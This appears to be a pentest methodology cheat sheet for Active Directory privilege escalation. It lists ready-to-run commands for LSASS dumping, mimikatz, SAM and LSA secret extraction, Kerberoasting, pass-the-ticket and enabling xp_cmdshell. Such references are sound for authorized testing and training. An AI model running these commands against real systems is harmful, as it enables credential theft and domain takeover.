# Privilege Escalation

Privilege escalation in Active Directory environments usually happens in two layers:

- local privilege escalation on a compromised Windows host
- domain privilege escalation through AD relationships, credentials, sessions, services, ACLs, infrastructure, and management systems

This section focuses on practical lab and pentest workflows for identifying escalation paths after initial access.

Useful resources:

- [HackTricks - Windows Local Privilege Escalation](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [The Hacker Recipes - Active Directory](https://www.thehacker.recipes/ad/)
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20Privilege%20Escalation)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec](https://www.netexec.wiki/)
- [WADComs](https://wadcoms.github.io/)

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export NTLM='8846f7eaee8fb117ad06bdd830b7586c'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export TARGET=10.10.10.20
export TARGET_HOST=app01.corp.local
export RANGE=10.10.10.0/24
```

---

## Local Privesc Windows

Local Windows privilege escalation starts with understanding the current user, host, privileges, groups, software, services, scheduled tasks, credentials, and misconfigurations.

Initial checks:

```cmd
whoami
whoami /user
whoami /groups
whoami /priv
hostname
ipconfig /all
systeminfo
```

PowerShell:

```powershell
$env:USERNAME
$env:USERDOMAIN
$env:COMPUTERNAME
Get-ComputerInfo
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

Operating system and patch context:

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

PowerShell:

```powershell
Get-HotFix
```

Current user privileges:

| Privilege | Why it matters |
| --- | --- |
| `SeImpersonatePrivilege` | Often useful for local privilege escalation in service contexts. |
| `SeAssignPrimaryTokenPrivilege` | Token-related escalation paths. |
| `SeBackupPrivilege` | Can read sensitive files through backup semantics. |
| `SeRestorePrivilege` | Can write files through restore semantics. |
| `SeDebugPrivilege` | Can access sensitive processes such as LSASS. |
| `SeTakeOwnershipPrivilege` | Can take ownership of files/objects. |
| `SeLoadDriverPrivilege` | Driver loading path. |
| `SeManageVolumePrivilege` | Volume-related abuse paths in some cases. |

Automated enumeration tools:

```cmd
winPEASx64.exe
Seatbelt.exe -group=all
PrivescCheck.ps1
```

PowerShell PrivescCheck:

```powershell
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

Service misconfigurations:

```cmd
sc query
wmic service get name,displayname,pathname,startmode,state
```

Find unquoted service paths:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Check service permissions with accesschk:

```cmd
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
```

PowerShell service paths:

```powershell
Get-CimInstance Win32_Service | Select-Object Name,StartMode,State,PathName
```

Writable directories in PATH:

```cmd
echo %PATH%
```

PowerShell:

```powershell
$env:PATH -split ';'
```

Check writable folders:

```cmd
icacls "C:\Program Files"
icacls "C:\Program Files (x86)"
icacls C:\Windows\Temp
icacls C:\Users\Public
```

Scheduled tasks:

```cmd
schtasks /query /fo LIST /v
```

PowerShell:

```powershell
Get-ScheduledTask
Get-ScheduledTaskInfo -TaskName "TaskName"
```

Look for tasks running as privileged users with writable scripts or binaries.

Startup locations:

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

AlwaysInstallElevated:

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be enabled to be useful.

Stored credentials:

```cmd
cmdkey /list
```

Run with stored credential if present:

```cmd
runas /savecred /user:CORP\admin cmd.exe
```

Credential Manager and Vault paths:

```text
C:\Users\<user>\AppData\Local\Microsoft\Credentials\
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
C:\Users\<user>\AppData\Local\Microsoft\Vault\
C:\Users\<user>\AppData\Roaming\Microsoft\Vault\
```

Interesting files:

```powershell
Get-ChildItem C:\Users -Recurse -Force -ErrorAction SilentlyContinue -Include *.txt,*.config,*.xml,*.json,*.ini,*.ps1,*.bat,*.cmd,*.kdbx,*.rdp,*.ppk,*.pem,*.key
```

Search for secrets:

```powershell
Select-String -Path C:\Users\*\* -Pattern "password","passwd","pwd","secret","token","api_key","connectionstring" -ErrorAction SilentlyContinue
```

Manual file search:

```cmd
findstr /S /I /M "password passwd pwd secret token api_key connectionstring" C:\Users\*.*
```

Registry credential checks:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

Installed software:

```cmd
wmic product get name,version
```

PowerShell:

```powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion,InstallLocation
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion,InstallLocation
```

Useful local paths:

```text
C:\Users\<user>\Desktop
C:\Users\<user>\Documents
C:\Users\<user>\Downloads
C:\Users\<user>\AppData
C:\ProgramData
C:\Temp
C:\Windows\Temp
C:\Scripts
C:\Backup
C:\inetpub\wwwroot
```

Local admin validation:

```cmd
net localgroup administrators
```

Network context:

```cmd
net use
net view
net view /domain
```

---

## Domain Privesc

Domain privilege escalation means moving from a normal or limited domain user to a more privileged domain identity or control path.

Common escalation sources:

| Source | Example |
| --- | --- |
| Group membership | Helpdesk, IT, Server Admins, Account Operators. |
| ACLs | GenericAll, GenericWrite, WriteDACL, AddMember. |
| Credentials | Passwords, hashes, tickets, DPAPI, vaults. |
| Sessions | Admin user logged onto controlled host. |
| Kerberos | Kerberoasting, ASREP roasting, delegation abuse. |
| AD CS | Vulnerable templates or relay paths. |
| GPOs | Writable GPOs or policy abuse. |
| Local admin paths | Local admin on server with privileged sessions. |
| MSSQL | SQL admin to OS or linked servers. |
| SCCM | Endpoint management control. |
| Exchange | Organization-level permissions or legacy misconfigs. |
| Backup systems | Restore/extract domain-sensitive data. |

Basic domain context:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN --pass-pol
```

PowerView:

```powershell
Get-Domain
Get-DomainController
Get-DomainPolicyData
Get-DomainSID
```

AD module:

```powershell
Get-ADDomain
Get-ADForest
Get-ADDomainController -Filter *
```

Find current user's groups:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --groups
```

PowerShell:

```powershell
whoami /groups
Get-ADPrincipalGroupMembership alice
```

BloodHound collection:

```bash
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All
```

NetExec BloodHound:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --bloodhound --collection All --dns-server $DC_IP
```

SharpHound:

```powershell
.\SharpHound.exe -c All
```

High-value groups to check:

| Group | Why it matters |
| --- | --- |
| Domain Admins | Full domain admin path. |
| Enterprise Admins | Forest-wide high privilege. |
| Schema Admins | Schema modification rights. |
| Administrators | Built-in privileged group. |
| Account Operators | Account management rights. |
| Server Operators | Server/DC operation context. |
| Backup Operators | Backup/restore privileges. |
| Print Operators | Legacy privileged group. |
| DnsAdmins | DNS admin path. |
| Group Policy Creator Owners | GPO creation rights. |
| Remote Management Users | WinRM access. |
| Remote Desktop Users | RDP access. |
| Helpdesk / Support / IT | Often delegated rights. |

Domain ACL enumeration:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs
```

DCSync check:

```powershell
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "Replication"}
```

Kerberoast:

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
```

ASREP roast:

```bash
GetNPUsers.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile asrep_hashes.txt
```

Delegation discovery:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --find-delegation
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --trusted-for-delegation
```

AD CS enumeration:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable
```

Local admin discovery:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN
nxc winrm $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

Common domain privesc indicators:

| Finding | Possible path |
| --- | --- |
| User can add group members | Add controlled user to privileged group. |
| User can reset password | Take over target account. |
| User has GenericWrite over service account | Add SPN or shadow credentials. |
| User has WriteDACL over domain root | Grant DCSync rights. |
| User is local admin on server | Hunt for sessions and secrets. |
| Admin session on controlled host | Dump tokens/tickets/credentials if allowed. |
| Vulnerable AD CS template | Certificate-based escalation. |
| SQL sysadmin | OS command execution or linked server path. |
| SCCM admin | Client push/script/deployment path. |
| Backup operator/admin | Restore sensitive files or extract secrets. |

---

## Service Accounts

Service accounts are accounts used by applications, services, scheduled tasks, databases, IIS app pools, backups, monitoring tools, deployment systems, and integrations.

They are important because they often have:

- long-lived passwords
- SPNs
- local admin rights on servers
- database privileges
- access to shares
- delegated rights
- weak password rotation
- privileged group membership
- stored credentials in scripts or configs

Find service-like users:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --users
```

LDAP by naming pattern:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(|(sAMAccountName=svc*)(sAMAccountName=*svc*)(sAMAccountName=*service*)(sAMAccountName=sql*)(sAMAccountName=app*)))" \
sAMAccountName description memberOf servicePrincipalName pwdLastSet lastLogonTimestamp
```

Users with SPNs:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
sAMAccountName servicePrincipalName memberOf pwdLastSet
```

PowerView:

```powershell
Get-DomainUser -SPN
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof,pwdlastset
```

Kerberoasting service accounts:

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
```

NetExec Kerberoasting:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --kerberoasting kerberoast_hashes.txt
```

Find service account logon locations:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --loggedon-users
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
```

Scheduled tasks running as service accounts:

```cmd
schtasks /query /fo LIST /v
```

Remote scheduled task review when admin:

```cmd
schtasks /query /S HOSTNAME /U CORP\alice /P Password123! /fo LIST /v
```

Services running as domain accounts:

```cmd
wmic service get name,startname,pathname,state
```

PowerShell:

```powershell
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
```

Search shares for service account credentials:

```bash
grep -RniE "svc_|service|password|passwd|pwd|connectionstring|user id|sql|backup|monitor" .
```

Common service account target types:

| Account type | What to check |
| --- | --- |
| SQL service account | MSSQL rights and server access. |
| IIS app pool account | Web configs and backend access. |
| Backup service account | Backup repository and restore permissions. |
| Monitoring account | Broad read/admin access. |
| Deployment account | Local admin on many hosts. |
| Scheduled task account | Password in task/config or reusable privileges. |
| Legacy application account | Weak password and broad access. |
| gMSA | Check who can retrieve managed password. |

gMSA enumeration:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --gmsa
```

LDAP gMSA search:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
sAMAccountName msDS-GroupMSAMembership servicePrincipalName
```

---

## Local Admin to Domain Admin

Local administrator on a domain-joined machine does not automatically mean domain admin.

The escalation path depends on what is present on that host.

Common paths from local admin to domain escalation:

| Source on host | Possible result |
| --- | --- |
| Admin user session | Token/ticket/credential extraction. |
| LSASS material | Hashes, tickets, DPAPI keys. |
| Saved credentials | Credential Manager, browser, scripts. |
| Service account running locally | Service account compromise. |
| Local files | Configs, backups, scripts. |
| Admin tools | Domain admin activity or saved configs. |
| SCCM/backup agents | Management system escalation. |
| Database clients | SQL credentials and linked servers. |
| Browser sessions | Admin web panels and tokens. |

Validate local admin:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --shares
```

Check sessions:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --loggedon-users
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --qwinsta
```

Windows:

```cmd
query user
qwinsta
whoami /all
```

Check processes:

```cmd
tasklist /v
```

PowerShell:

```powershell
Get-Process -IncludeUserName
```

Dump local SAM and LSA secrets with NetExec:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --sam
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --lsa
```

Dump LSASS in authorized labs:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -M lsassy
```

LSASS minidump from Windows:

```cmd
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

Parse dump:

```bash
pypykatz lsa minidump lsass.dmp
```

List tickets on host:

```cmd
klist
```

Rubeus triage:

```powershell
Rubeus.exe triage
```

Dump tickets in lab:

```powershell
Rubeus.exe dump
```

Search local filesystem:

```powershell
Get-ChildItem C:\Users -Recurse -Force -ErrorAction SilentlyContinue -Include *.txt,*.config,*.xml,*.json,*.ini,*.ps1,*.bat,*.cmd,*.kdbx,*.rdp,*.ppk,*.pem,*.key
```

Search common locations:

```powershell
Select-String -Path C:\Users\*\* -Pattern "password","passwd","pwd","secret","token","connectionstring","api_key" -ErrorAction SilentlyContinue
```

Check local administrators:

```cmd
net localgroup administrators
```

Typical group findings:

```text
CORP\Domain Admins
CORP\Server Admins
CORP\IT Admins
CORP\Helpdesk
```

Use newly found credential carefully:

```bash
nxc smb $RANGE -u NEWUSER -p 'NewPassword123!' -d $DOMAIN
nxc winrm $RANGE -u NEWUSER -p 'NewPassword123!' -d $DOMAIN
```

---

## Sessions and Tokens

Sessions and tokens show where identities are active.

A local admin on a host may be able to interact with tokens, tickets, or credentials for users logged on to that host.

Common session types:

| Session type | Meaning |
| --- | --- |
| Interactive | Console or local logon. |
| Remote Interactive | RDP session. |
| Network | SMB or network resource access. |
| Service | Service running under account. |
| Batch | Scheduled task or batch job. |
| Cached/logon artifacts | Registry hives, tickets, credentials depending on logon type. |

Find logged-on users with NetExec:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --loggedon-users
```

Registry sessions:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
```

RDP sessions:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --qwinsta
```

Windows:

```cmd
query user
qwinsta
quser
```

Local sessions:

```cmd
net session
```

PowerShell process ownership:

```powershell
Get-Process -IncludeUserName
```

Tokens in current context:

```cmd
whoami /user
whoami /groups
whoami /priv
```

List Kerberos tickets:

```cmd
klist
```

Rubeus:

```powershell
Rubeus.exe triage
Rubeus.exe klist
```

Dump tickets in lab:

```powershell
Rubeus.exe dump
```

Mimikatz token and session commands in lab:

```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
token::elevate
token::list
```

Pass the Ticket with captured ticket:

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

Linux ticket conversion:

```bash
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=$PWD/ticket.ccache
klist
```

Use ticket:

```bash
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
```

Important distinctions:

| Item | Meaning |
| --- | --- |
| User is logged on | User has active or recent session. |
| Ticket exists | Kerberos material may be usable. |
| Token exists | Local Windows security context. |
| Credential in LSASS | Password/hash/ticket may be extractable depending on protections. |
| Registry session | User profile loaded, not always interactive. |

High-value sessions:

| Session | Why it matters |
| --- | --- |
| Domain Admin | Domain-wide admin path. |
| Enterprise Admin | Forest-wide admin path. |
| Server Admin | Lateral movement path to servers. |
| Backup Admin | Backup system access. |
| SQL Admin | Database and OS escalation path. |
| SCCM Admin | Endpoint management path. |
| Exchange Admin | Mail/organization control path. |

---

## MSSQL Privesc

MSSQL can become a privilege escalation path when SQL privileges lead to OS command execution, credential exposure, linked servers, impersonation, or access to sensitive databases.

Common MSSQL ports:

| Port | Service |
| --- | --- |
| `1433` | MSSQL default instance |
| Dynamic ports | Named instances |
| `1434/UDP` | SQL Browser |

Discovery:

```bash
nmap -Pn -n -p1433 $RANGE
```

NetExec MSSQL:

```bash
nxc mssql $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

With hash:

```bash
nxc mssql $RANGE -u $USER -H $NTLM -d $DOMAIN
```

Impacket MSSQL client:

```bash
mssqlclient.py $DOMAIN/$USER:"$PASS"@$TARGET -windows-auth
```

With hash:

```bash
mssqlclient.py $DOMAIN/$USER@$TARGET -hashes :$NTLM -windows-auth
```

Check current SQL user and roles:

```sql
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name, type_desc, is_disabled FROM sys.server_principals;
```

List databases:

```sql
SELECT name FROM master..sysdatabases;
```

Check linked servers:

```sql
EXEC sp_linkedservers;
```

Query linked server:

```sql
SELECT * FROM OPENQUERY([LINKEDSERVER], 'SELECT SYSTEM_USER');
```

Impersonation checks:

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

Impersonate login:

```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT;
```

Check xp_cmdshell:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
```

Enable xp_cmdshell if sysadmin and in scope:

```sql
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Run OS command:

```sql
EXEC xp_cmdshell 'whoami';
```

NetExec command execution:

```bash
nxc mssql $TARGET -u $USER -p "$PASS" -d $DOMAIN -x "whoami"
```

Search SQL for credentials:

```sql
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;
```

Common interesting database/table names:

```text
users
accounts
credentials
config
settings
passwords
connections
employees
admins
```

MSSQL escalation indicators:

| Finding | Possible impact |
| --- | --- |
| `sysadmin` | OS command execution possible with xp_cmdshell. |
| SQL service account is privileged | OS/domain escalation possible. |
| Linked server as privileged login | Pivot across SQL servers. |
| Impersonation right | Become higher SQL principal. |
| Stored credentials | Reuse against AD or applications. |
| SQL Agent access | Job execution path. |

SQL Agent jobs:

```sql
SELECT * FROM msdb.dbo.sysjobs;
SELECT * FROM msdb.dbo.sysjobsteps;
```

---

## Exchange Privesc

Exchange servers and Exchange-related groups can create powerful Active Directory privilege paths.

Exchange is tightly integrated with AD and often has broad permissions over mail-enabled objects and organization configuration.

Common Exchange groups:

| Group | Notes |
| --- | --- |
| Organization Management | High Exchange administrative privilege. |
| Recipient Management | Can manage recipients. |
| Exchange Trusted Subsystem | High-trust Exchange group. |
| Exchange Windows Permissions | Historically important AD permission context. |
| Exchange Servers | Exchange server computer accounts. |
| Public Folder Management | Public folder administration. |
| View-Only Organization Management | Read-only Exchange role. |

Find Exchange servers:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --computers | grep -i exchange
```

LDAP search:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(|(servicePrincipalName=*exchange*)(dNSHostName=*exchange*)(cn=*Exchange*))" \
cn dNSHostName servicePrincipalName memberOf
```

Find Exchange groups:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=group)(cn=*Exchange*))" \
cn member
```

PowerView:

```powershell
Get-DomainGroup "*Exchange*"
Get-DomainGroupMember "Organization Management"
Get-DomainGroupMember "Exchange Windows Permissions"
```

Check current user membership:

```cmd
whoami /groups
```

PowerShell:

```powershell
Get-ADPrincipalGroupMembership alice | Where-Object {$_.Name -match "Exchange|Organization|Recipient"}
```

Exchange Management Shell examples from an Exchange management context:

```powershell
Get-ExchangeServer
Get-ManagementRoleAssignment -RoleAssignee alice
Get-RoleGroup
Get-RoleGroupMember "Organization Management"
```

Common Exchange privesc areas:

| Finding | Possible impact |
| --- | --- |
| Organization Management membership | Broad Exchange control. |
| Recipient Management membership | User/mailbox manipulation. |
| Exchange Windows Permissions path | AD permission path in some environments. |
| Exchange server local admin | Access to Exchange host and service context. |
| Exchange app pools/services | Service account/session material. |
| EWS/OWA access with admin role | Mailbox and org-level actions. |

Exchange server local admin checks:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN | grep -i exchange
nxc winrm $RANGE -u $USER -p "$PASS" -d $DOMAIN | grep -i exchange
```

If local admin on Exchange server, check sessions and secrets carefully:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --loggedon-users
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
```

---

## SCCM Privesc

SCCM/MECM can be a major privilege escalation path because it manages endpoints, software deployment, scripts, local admin policies, and client configuration.

Common SCCM/MECM components:

| Component | Notes |
| --- | --- |
| Site server | Central SCCM infrastructure. |
| Management Point | Client communication. |
| Distribution Point | Package/content distribution. |
| SQL database | SCCM data and configuration. |
| Client push account | May have local admin rights. |
| Network access account | May access package shares. |
| Collection | Group of managed devices/users. |
| Application/package | Software deployment object. |
| Scripts | Run scripts feature. |

Find SCCM systems by hostname:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN | grep -Ei "sccm|mecm|configmgr|sms"
```

LDAP search:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(|(dNSHostName=*sccm*)(dNSHostName=*mecm*)(dNSHostName=*sms*)(cn=*SCCM*)(cn=*MECM*)(cn=*ConfigMgr*))" \
cn dNSHostName operatingSystem servicePrincipalName
```

Find SCCM-related groups:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=group)(|(cn=*SCCM*)(cn=*MECM*)(cn=*SMS*)(cn=*ConfigMgr*)))" \
cn member
```

Check shares on SCCM-like hosts:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --shares
```

Common SCCM shares:

```text
SMS_<SiteCode>
SCCMContentLib$
SMSSIG$
SMSPKGx$
ADMIN$
C$
```

List files:

```bash
smbclient //$TARGET/SMS_SITE -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; ls'
```

Search downloaded SCCM content:

```bash
grep -RniE "password|passwd|pwd|secret|token|account|network access|client push|connectionstring" .
```

Check local admin on SCCM server:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN
nxc winrm $TARGET -u $USER -p "$PASS" -d $DOMAIN
```

If SQL is reachable:

```bash
nxc mssql $TARGET -u $USER -p "$PASS" -d $DOMAIN
mssqlclient.py $DOMAIN/$USER:"$PASS"@$TARGET -windows-auth
```

SCCM privesc indicators:

| Finding | Possible impact |
| --- | --- |
| SCCM admin role | Deploy scripts/apps to clients. |
| Local admin on site server | Access packages, configs, database, service context. |
| Client push account exposed | Local admin on many endpoints. |
| Network access account exposed | Access to deployment content. |
| Writable package source | Deployment tampering in labs. |
| SQL access to SCCM DB | Credential/config discovery. |
| Collection control | Targeted deployment path. |

Tools often used for SCCM assessment:

```text
SharpSCCM
SCCMHunter
PowerSCCM
```

Example discovery with SCCMHunter if installed:

```bash
sccmhunter.py find -u $USER -p "$PASS" -d $DOMAIN -dc-ip $DC_IP
```

---

## Backup Systems Privesc

Backup systems are high-value because they may store copies of servers, databases, domain controllers, service accounts, configuration files, and credentials.

Common backup platforms:

```text
Veeam
Commvault
Veritas NetBackup
Acronis
Rubrik
Cohesity
Arcserve
Windows Server Backup
Backup Exec
```

Common backup system risks:

| Finding | Possible impact |
| --- | --- |
| Backup admin access | Restore or extract sensitive data. |
| Backup server local admin | Access backup configs and repositories. |
| Backup service account | Often privileged across servers. |
| Backup repository access | Read backup files. |
| SQL database access | Backup metadata and credentials. |
| Domain controller backups | Extract NTDS/SYSTEM if accessible. |
| File server backups | Sensitive documents and configs. |

Find backup servers by hostname:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN | grep -Ei "backup|veeam|commvault|rubrik|cohesity|netbackup|acronis"
```

LDAP search:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(|(dNSHostName=*backup*)(dNSHostName=*veeam*)(dNSHostName=*commvault*)(dNSHostName=*rubrik*)(dNSHostName=*cohesity*)(cn=*backup*)(cn=*veeam*))" \
cn dNSHostName operatingSystem servicePrincipalName
```

Find backup-related groups:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=group)(|(cn=*backup*)(cn=*veeam*)(cn=*commvault*)(cn=*rubrik*)(cn=*cohesity*)))" \
cn member
```

Check local admin on backup hosts:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN
nxc winrm $TARGET -u $USER -p "$PASS" -d $DOMAIN
```

Enumerate shares:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --shares
smbclient -L //$TARGET/ -U "$DOMAIN/$USER%$PASS"
```

Common backup shares and paths:

```text
Backups
Backup
Veeam
Repository
Repo
VBRCatalog
VeeamBackup
Dumps
Exports
```

Search files after download:

```bash
find . -iname "*backup*" -o -iname "*.vbk" -o -iname "*.vib" -o -iname "*.vbm" -o -iname "*.bak" -o -iname "*.zip" -o -iname "*.7z"
grep -RniE "password|passwd|pwd|secret|token|account|domain admin|administrator|connectionstring" .
```

Veeam-related paths to recognize:

```text
C:\Program Files\Veeam\
C:\ProgramData\Veeam\
C:\VBRCatalog\
```

Check installed backup software:

```powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion,InstallLocation | Where-Object {$_.DisplayName -match "Veeam|Backup|Commvault|Acronis|Rubrik|Cohesity|Veritas"}
```

Check services:

```cmd
sc query
wmic service get name,startname,pathname,state | findstr /i "veeam backup commvault acronis rubrik cohesity"
```

Backup privesc indicators:

| Finding | Possible impact |
| --- | --- |
| Backup console admin | Restore sensitive systems. |
| Backup DB access | Credential/config extraction path. |
| Repository read access | Extract files from backups. |
| Backup service account password | Lateral movement to protected systems. |
| DC backup accessible | Potential NTDS/SYSTEM extraction. |
| SQL backup accessible | Database credential recovery. |

Domain controller backup artifacts:

```text
NTDS.dit
SYSTEM
SECURITY
SAM
registry hives
VHD/VHDX
VM snapshots
```

Handle backup data carefully because it often contains production-sensitive information.

---

## Privesc Checklist

- [ ] **Confirm current context**

  ```cmd
  whoami
  whoami /groups
  whoami /priv
  hostname
  ipconfig /all
  systeminfo
  ```

- [ ] **Check local privilege escalation basics**

  ```cmd
  wmic service get name,displayname,pathname,startmode,state
  schtasks /query /fo LIST /v
  cmdkey /list
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  ```

- [ ] **Run local enumeration tools in lab**

  ```cmd
  winPEASx64.exe
  Seatbelt.exe -group=all
  ```

  ```powershell
  Import-Module .\PrivescCheck.ps1
  Invoke-PrivescCheck
  ```

- [ ] **Search for local secrets**

  ```powershell
  Get-ChildItem C:\Users -Recurse -Force -ErrorAction SilentlyContinue -Include *.txt,*.config,*.xml,*.json,*.ini,*.ps1,*.bat,*.cmd,*.kdbx,*.rdp,*.ppk,*.pem,*.key
  Select-String -Path C:\Users\*\* -Pattern "password","passwd","pwd","secret","token","api_key","connectionstring" -ErrorAction SilentlyContinue
  ```

- [ ] **Confirm domain context**

  ```bash
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN --pass-pol
  ```

